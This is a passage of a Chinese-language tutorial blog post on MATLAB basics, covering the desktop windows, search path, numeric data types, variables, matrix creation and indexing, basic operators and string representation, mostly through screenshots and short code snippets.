<li>快速访问工具栏：包含一些常用按钮</li>
<li>当前文件夹工具栏：用于实现当前文件夹的操作</li>
</ul>
<hr>
<span id="more"></span>

<p>2 命令行窗口<br><img src="https://img-blog.csdnimg.cn/20200225164656339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令行窗口用于输入命令并显示命令的执行结果。在命令提示符$&gt;&gt;$后输入命令并按下回车键，Matlab就会解释执行输入的命令并显示结果<br><img src="https://img-blog.csdnimg.cn/20200225165313252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p>3 当前文件夹窗口<br><img src="https://img-blog.csdnimg.cn/20200225165444784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225165545892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意：一定要先建立文件夹，再将文件夹设为当前文件夹。<br><img src="https://img-blog.csdnimg.cn/20200225165715889.png" alt="在这里插入图片描述"></p>
<hr>
<p>4 工作区窗口<br>是Matlab用于存储各种变量和结果的空间，可用于变量的显示和操作。<br><img src="https://img-blog.csdnimg.cn/20200225165949976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在工作区以表格形式显示变量a与x的名称，取值等信息。在工作区还可以对变量进行保存、编辑、删除等操作。</p>
<hr>
<h2 id="A-b-MATLAB的搜索路径"><a href="#A-b-MATLAB的搜索路径" class="headerlink" title="A.b MATLAB的搜索路径"></a>A.b MATLAB的搜索路径</h2><p>1 用户在命令行窗口输入一条命令后，MATLAB将按照一定顺序依次寻找命令对象。<br>顺序（当以下都同名时）：<br><img src="https://img-blog.csdnimg.cn/20200225170539698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如（clear清楚工作区的全部变量）：<br><img src="https://img-blog.csdnimg.cn/20200225170658693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以定义变量名时要避免与文件名和函数名重复。</p>
<hr>
<p>2 设置文件搜索路径<br><img src="https://img-blog.csdnimg.cn/20200225171150978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在命令行输入文件名后，MATLAB是在当前文件夹与搜索路径文件夹中寻找这个文件并执行文件内容的，所以要执行的文件必须放在这两类文件夹中。<br>如果两个文件夹种有同名的M文件，在命令行输入这个文件名执行顺序：当前文件夹&gt;搜索路径文件夹</p>
<hr>
<h1 id="B-MATLAB数值数据"><a href="#B-MATLAB数值数据" class="headerlink" title="B MATLAB数值数据"></a>B MATLAB数值数据</h1><h2 id="B-a-数值数据类型的分类-class"><a href="#B-a-数值数据类型的分类-class" class="headerlink" title="B.a 数值数据类型的分类(class)"></a>B.a 数值数据类型的分类(class)</h2><p>1 整形：<br><img src="https://img-blog.csdnimg.cn/20200225173043805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225173117852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p>2 浮点型<br><img src="https://img-blog.csdnimg.cn/20200225173216509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>class函数可以得到参数的数据类型。<br><img src="https://img-blog.csdnimg.cn/20200225173308488.png" alt="在这里插入图片描述"></p>
<hr>
<p>3 复数型<br><img src="https://img-blog.csdnimg.cn/20200225173359365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">real() %求复数的实部</span><br><span class="line">imag() %求复数的虚部</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="B-b-数值数据的输出格式-format"><a href="#B-b-数值数据的输出格式-format" class="headerlink" title="B.b 数值数据的输出格式(format)"></a>B.b 数值数据的输出格式(format)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">format 格式符  % 设置数据的输出格式</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200225173742228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不同的格式符输出不同的数据格式。<br>注意：format命令只是影响数据输出的格式，而不影响数据的计算和存储。</p>
<hr>
<h2 id="B-c-常用数学函数"><a href="#B-c-常用数学函数" class="headerlink" title="B.c 常用数学函数"></a>B.c 常用数学函数</h2><h3 id="B-c-a-函数的调用格式"><a href="#B-c-a-函数的调用格式" class="headerlink" title="B.c.a 函数的调用格式"></a>B.c.a 函数的调用格式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">函数名（函数自变量的值）</span><br></pre></td></tr></table></figure>
<p>函数的自变量规定为矩阵变量（标量本身是矩阵的一种特例）。<br><strong>函数在运算时是将函数逐项作用于矩阵的每个元素上</strong>，所以最后运算的结果就是一个与自变量同型的矩阵。<br><img src="https://img-blog.csdnimg.cn/20200225174501225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="B-c-b-常用函数的应用-sin-sind-abs-取整"><a href="#B-c-b-常用函数的应用-sin-sind-abs-取整" class="headerlink" title="B.c.b 常用函数的应用(sin,sind;abs;取整)"></a>B.c.b 常用函数的应用(sin,sind;abs;取整)</h3><p><img src="https://img-blog.csdnimg.cn/20200225174641778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225174828815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225175107125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rem(m,n)   %求m/n的余数</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200225175522721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">isprime(n) <span class="comment"># 判断n是否是素数，是返回1，否返回0.</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200225180657183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="C-变量及其操作"><a href="#C-变量及其操作" class="headerlink" title="C 变量及其操作"></a>C 变量及其操作</h1><p>计算机处理的数据都是存放在内存单元中的，而每一个内存单元都有一个唯一的地址，程序就是通过这个地址来访问对应内存单元的。<br>在如Matlab这种高级语言中，只需要给每个内存单元取一个名字，然后通过这个名字就能访问每个内存单元了。</p>
<h2 id="C-a-变量与赋值语句"><a href="#C-a-变量与赋值语句" class="headerlink" title="C.a 变量与赋值语句"></a>C.a 变量与赋值语句</h2><ul>
<li>变量本质上讲是内存单元的一个抽象</li>
<li>在Matlab中，变量名是以字母开头，后接字母、数字或下划线的字母序列，最多63个字符。<br><img src="https://img-blog.csdnimg.cn/20200225185102476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>变量名区分大小写</li>
<li>标准函数名以及命令名必须用小写字母</li>
</ul>
<hr>
<p>赋值语句两种格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量=表达式        % 变量结果会在命令行中显示出来</span><br><span class="line">变量=表达式；	  % 变量结果不会在命令行中显示出来</span><br></pre></td></tr></table></figure>
<p>例子：<br><img src="https://img-blog.csdnimg.cn/20200225185751144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-b-预定义变量"><a href="#C-b-预定义变量" class="headerlink" title="C.b 预定义变量"></a>C.b 预定义变量</h2><p><img src="https://img-blog.csdnimg.cn/20200225190113487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="C-c-变量的管理"><a href="#C-c-变量的管理" class="headerlink" title="C.c 变量的管理"></a>C.c 变量的管理</h2><h3 id="C-c-a-变量的删除和修改（who-whos）"><a href="#C-c-a-变量的删除和修改（who-whos）" class="headerlink" title="C.c.a 变量的删除和修改（who,whos）"></a>C.c.a 变量的删除和修改（who,whos）</h3><p>在工作区选择变量右击即可进行删除和修改。<br><img src="https://img-blog.csdnimg.cn/20200225190331526.png" alt="在这里插入图片描述"><br>who命令和whos命令：<br>who命令只显示已存在变量的名称。而whos显示信息更多。<br><img src="https://img-blog.csdnimg.cn/20200225190517955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h3 id="C-c-b-内存变量文件-save-load"><a href="#C-c-b-内存变量文件-save-load" class="headerlink" title="C.c.b 内存变量文件(save,load)"></a>C.c.b 内存变量文件(save,load)</h3><p>用于保存Matlab工作区变量的文件叫做内存变量文件，其扩展名为.mat，也叫MAT文件，是一种标准的二进制格式文件。<br>save命令：创建内存变量文件<br>load命令：载入内存变量文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save mydata a x   % 将a x保存在mydata.mat文件中</span><br><span class="line">load mydata       % 载入mydata.mat中的变量</span><br></pre></td></tr></table></figure>

<h1 id="D-MATLAB矩阵表示"><a href="#D-MATLAB矩阵表示" class="headerlink" title="D MATLAB矩阵表示"></a>D MATLAB矩阵表示</h1><h2 id="D-a-矩阵的建立"><a href="#D-a-矩阵的建立" class="headerlink" title="D.a 矩阵的建立"></a>D.a 矩阵的建立</h2><p><img src="https://img-blog.csdnimg.cn/20200225192208567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225192454699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="D-b-冒号表达式-linspace"><a href="#D-b-冒号表达式-linspace" class="headerlink" title="D.b 冒号表达式(linspace)"></a>D.b 冒号表达式(linspace)</h2><p>1 用冒号产生行向量t：<br><img src="https://img-blog.csdnimg.cn/2020022519264856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p>2 用linspace函数产生行向量x:<br><img src="https://img-blog.csdnimg.cn/20200225192806840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="D-c结构矩阵和单元矩阵"><a href="#D-c结构矩阵和单元矩阵" class="headerlink" title="D.c结构矩阵和单元矩阵"></a>D.c结构矩阵和单元矩阵</h2><h3 id="D-c-a-结构矩阵："><a href="#D-c-a-结构矩阵：" class="headerlink" title="D.c.a 结构矩阵："></a>D.c.a 结构矩阵：</h3><p>   在实际应用中，经常会遇到不同类型的数据项组成的实体，例如一个学生的数据实体就包括了年龄，姓名，学号，这些数据是相互联系的。结构数据类型就可以把这些数据类型不同但逻辑上相关的数据组成一个有机的整体。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">结构矩阵元素.成员名=表达式</span><br></pre></td></tr></table></figure>

<p>   例如： 学生这个结构数据包含三个成员，分别是年龄，姓名，学号，由结构数据构成的矩阵就是结构矩阵。结构矩阵里的每个元素都是结构数据类型的。即结构矩阵相当于一个班级，结构矩阵里的元素就是这个班级的学生，每个学生有年龄，姓名，学号三个信息（成员）。</p>
<p> <img src="https://img-blog.csdnimg.cn/20200225195123796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="D-c-b-单元矩阵"><a href="#D-c-b-单元矩阵" class="headerlink" title="D.c.b 单元矩阵"></a>D.c.b 单元矩阵</h3><p>单元数据类型，也是把不同的数据放在一个变量中，但与结构矩阵所不同的是，结构矩阵的各个元素下还有成员，每个成员都有自己的名字，而单元矩阵的各个元素就是不同类型的数据，每个元素直接由不同类型的数据组成。<br><img src="https://img-blog.csdnimg.cn/20200225200109661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="E-矩阵元素的引用"><a href="#E-矩阵元素的引用" class="headerlink" title="E 矩阵元素的引用"></a>E 矩阵元素的引用</h1><h2 id="E-a-矩阵元素的引用方式-sub2ind-ind2sub"><a href="#E-a-矩阵元素的引用方式-sub2ind-ind2sub" class="headerlink" title="E.a 矩阵元素的引用方式(sub2ind,ind2sub)"></a>E.a 矩阵元素的引用方式(sub2ind,ind2sub)</h2><p><img src="https://img-blog.csdnimg.cn/20200225201212298.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202002252008579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果给出的行下标和列下标大于矩阵的行数和列数，Matlab将自动扩展原来的矩阵，并将扩展后没有赋值的元素赋值为0。<br><img src="https://img-blog.csdnimg.cn/20200225200943309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225201114187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225201258314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225202516110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225203322435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="E-b-利用冒号表达式获得子矩阵-end"><a href="#E-b-利用冒号表达式获得子矩阵-end" class="headerlink" title="E.b 利用冒号表达式获得子矩阵(end)"></a>E.b 利用冒号表达式获得子矩阵(end)</h2><p>子矩阵是指由矩阵中一部分元素构成的矩阵。<br><img src="https://img-blog.csdnimg.cn/20200225203609383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子:<br><img src="https://img-blog.csdnimg.cn/2020022520395972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225204124604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="E-c利用空矩阵删除矩阵的元素"><a href="#E-c利用空矩阵删除矩阵的元素" class="headerlink" title="E.c利用空矩阵删除矩阵的元素"></a>E.c利用空矩阵删除矩阵的元素</h2><p><img src="https://img-blog.csdnimg.cn/20200225204212560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225204254928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="E-d改变矩阵的形状-reshape"><a href="#E-d改变矩阵的形状-reshape" class="headerlink" title="E.d改变矩阵的形状(reshape)"></a>E.d改变矩阵的形状(reshape)</h2><p>在矩阵<strong>总元素保持不变</strong>的前提下，将矩阵A重新排成$m*n$的二维矩阵。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reshape(A,m,n)</span><br></pre></td></tr></table></figure>
<p>注意：reshape函数只是改变原矩阵的行数和列数，但并不改变原矩阵元素个数及其存储顺序。<br><img src="https://img-blog.csdnimg.cn/20200225204803537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225204859210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A(:)等价于reshape(A,6,1)</span><br></pre></td></tr></table></figure>

<h1 id="F-MATLAB基本运算"><a href="#F-MATLAB基本运算" class="headerlink" title="F MATLAB基本运算"></a>F MATLAB基本运算</h1><h2 id="F-a算术运算"><a href="#F-a算术运算" class="headerlink" title="F.a算术运算"></a>F.a算术运算</h2><p><img src="https://img-blog.csdnimg.cn/20200225205324727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200225205433194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200225205539131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200225205645610.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225205811959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p>A^2&#x3D;A*A<img src="https://img-blog.csdnimg.cn/20200225205913897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<p><img src="https://img-blog.csdnimg.cn/2020022521004121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200225210215622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225210349514.png" alt="在这里插入图片描述"></p>
<hr>
<h2 id="F-b-关系运算"><a href="#F-b-关系运算" class="headerlink" title="F.b 关系运算"></a>F.b 关系运算</h2><p><img src="https://img-blog.csdnimg.cn/20200225210731220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225210834666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h2 id="F-c-逻辑运算-amp"><a href="#F-c-逻辑运算-amp" class="headerlink" title="F.c 逻辑运算(&amp;,|,~)"></a>F.c 逻辑运算(&amp;,|,~)</h2><p><img src="https://img-blog.csdnimg.cn/20200225210947381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200225211054779.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225211309602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<p><img src="https://img-blog.csdnimg.cn/20200225211400528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例题：<br><img src="https://img-blog.csdnimg.cn/20200225211611641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<hr>
<h1 id="G-字符串处理"><a href="#G-字符串处理" class="headerlink" title="G 字符串处理"></a>G 字符串处理</h1><h2 id="G-a-字符串的表示"><a href="#G-a-字符串的表示" class="headerlink" title="G.a 字符串的表示"></a>G.a 字符串的表示</h2><p><img src="https://img-blog.csdnimg.cn/20200225213621487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200225213714464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200225213839358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要求各行字符数要相等（列数相同）。如果不等，就要用空格调节各行长度，使之数目相等。</p>
</blockquote>
<blockquote>
